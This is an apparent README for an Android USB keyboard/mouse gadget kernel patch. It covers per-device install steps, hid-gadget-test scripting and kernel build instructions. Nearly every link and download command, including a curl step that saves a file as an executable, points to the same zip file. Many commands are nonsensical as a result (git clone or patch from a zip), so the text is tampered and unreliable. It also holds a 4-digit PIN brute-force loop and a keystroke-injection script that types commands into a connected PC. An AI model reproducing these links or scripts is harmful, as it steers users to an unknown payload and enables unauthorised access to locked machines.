Convert your Android device into USB keyboard/mouse, control your PC from your Android device remotely, including BIOS/bootloader.

For newer Kernel versions (>= 3.19) the patch is not anymore required and can be replaced by ConfigFS ([USB Gadget Tool](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip)).

#### Apps & tools using android-keyboard-gadget:
* [USB Keyboard](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip)
* hid-gadget-test
* [Authorizer](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip)

Installation
============

Nexus 7 2012 WiFi (Grouper)
---------------------------

- Plug your device into PC using USB cable.
- Power off the device.
- Hold Volume Down button and Power button for 5 seconds, to enter fastboot mode.
- Copy appropriate fastboot executable from the directory `fastboot`.
- Launch command `fastboot oem unlock`
- Confirm unlock action by pressing Power button. This will factory reset your device.
- Copy `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip` from directory [nexus7-2012-wifi-grouper](nexus7-2012-wifi-grouper).
- Launch command `fastboot flash boot https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip`.
- Reboot your device using Power button.
- Install and run USB Keyboard app.

Nexus 7 2013
------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

LG G2
-----

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

LG G2 with Cyanogenmod 12.0
---------------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Nexus 5
-------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
- [Boot image for Android 5.0](nexus5-hammerhead-android-5.0)

Nexus 4
-------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Sony Ericsson phones
--------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Motorola Moto G with Cyanogenmod
--------------------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Motorola Moto E with Cyanogenmod
--------------------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Motorola Moto G 2014
--------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip


Motorola Moto X Style (Pure) 2015
---------------------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

OnePlus One
-----------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip - it's ROM, not just a kernel

Galaxy S4
---------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip - you have to enable it in the included STweaks app

Galaxy Note 2
-------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Huawei Ideos X5
---------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Sony Xperia Z3 and Z3 Compact
-----------------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Sony Xperia Z Ultra
-------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Xiaomi Redmi 1S
---------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Xiaomi Redmi 3S
---------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Galaxy Ace 2
------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Xiaomi MI3
----------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Galaxy Note 4
-------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Asus Zenfone 2 ZE551ML
----------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Asus Zenfone 2 Laser (Z00L/Z00T)
----------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Sony Xperia Z5 Premium E6853
----------------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Sony Xperia Z5 Compact
----------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Xiaomi Redmi 2
--------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Sony Xperia SP
--------------

https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Xiaomi Redmi Note 3
-------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Samsung Galaxy Tab 2 (any espresso3g based device)
--------------------------------------------------

- https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip

Other devices
-------------

- You will have to compile the kernel yourself.

Scripting
=========

There is a possibility to send keypresses in an automated way, using terminal emulator for Android or similar app.
This is done using [hid-gadget-test](hid-gadget-test/hid-gadget-test?raw=true) utility.

First, copy this utility to your device.

	adb push hid-gadget-test /data/local/tmp
	adb shell chmod 755 /data/local/tmp/hid-gadget-test

You will need to set world-writable permissions on /dev/hidg0, or run hid-gadget-test from root shell.

	adb shell
	su
	chmod 666 /dev/hidg0 /dev/hidg1

To always have root shell, so you don't need to enter 'su' each time, run command

	adb root

Then, use hid-gadget-test to send keypresses.

	adb shell
	cd /data/local/tmp

	# Send letter 'a'
	echo a | ./hid-gadget-test /dev/hidg0 keyboard

You can also run this command without launching ADB shell, from shell script or .bat file.

	adb shell 'echo a | /data/local/tmp/hid-gadget-test /dev/hidg0 keyboard'

Advanced examples.

	# Send letter 'B'
	echo left-shift b | ./hid-gadget-test /dev/hidg0 keyboard

	# Send string 'abcdeZ'
	for C in a b c d e 'left-shift z' ; do echo "$C" ; sleep 0.1 ; done | ./hid-gadget-test /dev/hidg0 keyboard

	# You may combine several modifier keys
	echo left-ctrl left-shift enter | ./hid-gadget-test /dev/hidg0 keyboard

	# Try to guess what this command sends
	echo left-ctrl left-alt del | ./hid-gadget-test /dev/hidg0 keyboard

	# Bruteforce 4-digit PIN-code, that's a particularly popular script
	# that people keep asking me for. It executes for 42 hours.
	for a in 0 1 2 3 4 5 6 7 8 9; do
	for b in 0 1 2 3 4 5 6 7 8 9; do
	for c in 0 1 2 3 4 5 6 7 8 9; do
	for d in 0 1 2 3 4 5 6 7 8 9; do
	echo $a $b $c $d
	for C in $a $b $c $d enter ; do echo "$C" ; sleep 0.2 ; done | ./hid-gadget-test /dev/hidg0 keyboard
	sleep 15
	done
	done
	done
	done

	# Press right mouse button
	echo --b2 | ./hid-gadget-test /dev/hidg1 mouse

	# Hold left mouse button, drag 100 pixels to the right and 50 pixels up, then release
	echo --hold --b1 | ./hid-gadget-test /dev/hidg1 mouse
	echo --hold --b1 100 0 | ./hid-gadget-test /dev/hidg1 mouse
	echo --hold --b1 0 -50 | ./hid-gadget-test /dev/hidg1 mouse
	echo --b1 | ./hid-gadget-test /dev/hidg1 mouse

You can check the modification time of file `/sys/devices/virtual/hidg/hidg0/dev`
to know when the USB cable has been plugged into PC, however this does not always work,
so it's better to simply check if hid-gadget-test returned an error.

Here's a sample shell script that will send a predefined key sequence when USB cable is plugged into PC:

	#!/system/bin/sh
	while true; do
		until echo volume-up | ./hid-gadget-test /dev/hidg0 keyboard >/dev/null 2>&1; do
			sleep 2
		done
		echo "USB cable plugged"
		sleep 1
		for C in 'left-meta r' c m d enter s t a r t space i e x p l o r e space x x x period c o m enter \
			; do echo "$C" ; sleep 0.3 ; done | ./hid-gadget-test /dev/hidg0 keyboard
		echo "Done sending commands"
		while echo volume-up | ./hid-gadget-test /dev/hidg0 keyboard >/dev/null 2>&1; do
			sleep 2
		done
		echo "USB cable unplugged"
	done

Here is [the list of keys that hid-gadget-test utility supports](hid-gadget-test/jni/hid-gadget-test.c#L33)

If you need to crack a PIN code, but the target system loses keypresses (happens in MacOS BIOS),
there is a [handy app](send-pin-with-camera/) for that,
which uses camera to check if each keypress is recognized.

You can also run DuckyScript files used by USB Rubber Ducky keystroke injection tool,
with the help of [this neat shell script](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip).


Compiling kernel
================

You have to run all following commands on Linux. Windows is not supported. These instructions are for Nexus 7 2012, change them for your device accordingly.

To compile kernel, launch commands

	git clone https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
	git clone https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
	export PATH=`pwd`/arm-eabi-4.8/bin:$PATH
	export ARCH=arm
	export SUBARCH=arm
	export CROSS_COMPILE=arm-eabi-
	cd tegra
	git checkout android-tegra3-grouper-3.1-lollipop-mr1
	patch -p1 < https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
	make tegra3_android_defconfig
	make -j4

https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip - Tested patch files
(pro) Tip: https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip is just patches for AOSP roms and just by basic kernel versions. 3.01 is acceptable for 3.0.101. Other patch files is for devices only. The file named HTC Flounder will be acceptable ONLY FOR HTC Flounder!

To compile `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip`, launch commands

	mkdir ~/bin
	export PATH=~/bin:$PATH
	curl https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip > ~/bin/repo
	chmod a+x ~/bin/repo
	mkdir aosp
	cd aosp
	repo init -u https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip -b android-4.4.2_r1
	repo sync
	cp -f ../tegra/arch/arm/boot/zImage device/asus/grouper/kernel
	make -j4 TARGET_PRODUCT=aosp_grouper TARGET_BUILD_VARIANT=userdebug

You then can find `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip` in directory `aosp/out/target/product/grouper`.

Nexus 7 2012 does not put any SELinux restrictions on the files inside /dev,
however most other devices typically restrict all access inside /dev for apps,
which means you will be able to use `hid-gadget-test` command from the root shell,
but the Android app will fail to launch.

SELinux can be temporarily disabled with a command

	setenforce 0

however this will considerably weaken your device security,
so it's better to add specific SELinux exception for `/dev/hidg0` and `/dev/hidg1`.

SELinux rules can be found at path

	device/asus/grouper/sepolicy

Replace `asus/grouper` with your device manufacturer/model, then add following lines to SELinux rules.

In file `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip` - the declaration of SELinux security context type:

	type hid_gadget_device, dev_type;

In file `file_contexts` - binding the device paths to the security context:

	# USB Gadget
	/dev/hidg(.*)                        u:object_r:hid_gadget_device:s0

In file `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip` - the rule itself to allow apps using this security context:

	allow appdomain hid_gadget_device:chr_file rw_file_perms;

Then recompile `https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip`.


Compiling USB Keyboard app
==========================

To compile USB Keyboard app, install Android SDK and NDK from site https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip , and launch commands

	git clone https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip
	cd commandergenius
	git submodule update --init --recursive
	rm -f project/jni/application/src
	ln -s hid-pc-keyboard project/jni/application/src
	https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip -a
	android update project -p project

How it works
============

The custom kernel you have compiled adds two new devices, /dev/hidg0 for keyboard, and /dev/hidg1 for mouse.

You can open these two files, using open() system call,
and write raw keyboard/mouse events there, using write() system call,
which will be sent through USB cable to your PC.

Keyboard event is an array of 8 byte length, first byte is a bitmask of currently pressed modifier keys:

	typedef enum {
		LCTRL = 0x1,
		LSHIFT = 0x2,
		LALT = 0x4,
		LSUPER = 0x8, // Windows key
		RCTRL = 0x10,
		RSHIFT = 0x20,
		RALT = 0x40,
		RSUPER = 0x80, // Windows key
	} ModifierKeys_t;

Remaining 7 bytes is a list of all other keys currently pressed, one byte for one key, or 0 if no key is pressed.
Consequently, the maximum amount of keys that may be pressed at the same time is 7, excluding modifier keys.

Professional or 'gamer' USB keyboards report several keyboard HID descriptors, which creates several keyboard devices in host PC,
to overcome that 7-key limit.

The scancode table for each key is available [in hid-gadget-test utility](hid-gadget-test/jni/hid-gadget-test.c#L33).
Extended keys, such as Play/Pause, are not supported, because they require modifying USB descriptor in kernel patch.

Mouse event is an array of 4 bytes, first byte is a bitmask of currently pressed mouse buttons:

	typedef enum {
		BUTTON_LEFT = 0x1,
		BUTTON_RIGHT = 0x2,
		BUTTON_MIDDLE = 0x4,
	} MouseButtons_t;

Remaining 3 bytes are X movement offset, Y movement offset, and mouse wheel offset, represented as signed integers.
Horizontal wheel is not supported yet.

See functions outputSendKeys() and outputSendMouse() inside file [https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip](https://raw.githubusercontent.com/Ramzanwer/android-keyboard-gadget/master/send-pin-with-camera/gadget_keyboard_android_v1.1.zip)
for reference implementation.
